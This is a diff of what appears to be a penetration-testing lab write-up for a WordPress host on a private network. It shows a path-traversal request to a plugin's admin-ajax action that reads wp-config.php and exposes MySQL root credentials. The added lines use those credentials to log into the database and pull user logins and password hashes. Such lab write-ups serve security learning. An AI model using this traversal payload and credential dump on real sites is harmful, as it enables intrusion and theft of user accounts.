@@ -37,4 +37,8 @@ results:
 5. Check the wp config with: https://192.168.56.102/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
 > wget file
 > cat file [image], result: wp-config.php with mysql credentials: user: root, password: plbkac
-> connecting to mysql DB with 
+> connecting to mysql DB with > mysql -u root -h 192.168.56.102 -p (password is plbkac!)
+> mysql> show databases
+use wordpress;
+show tables;
+select user_login, user_pass from wp_users;
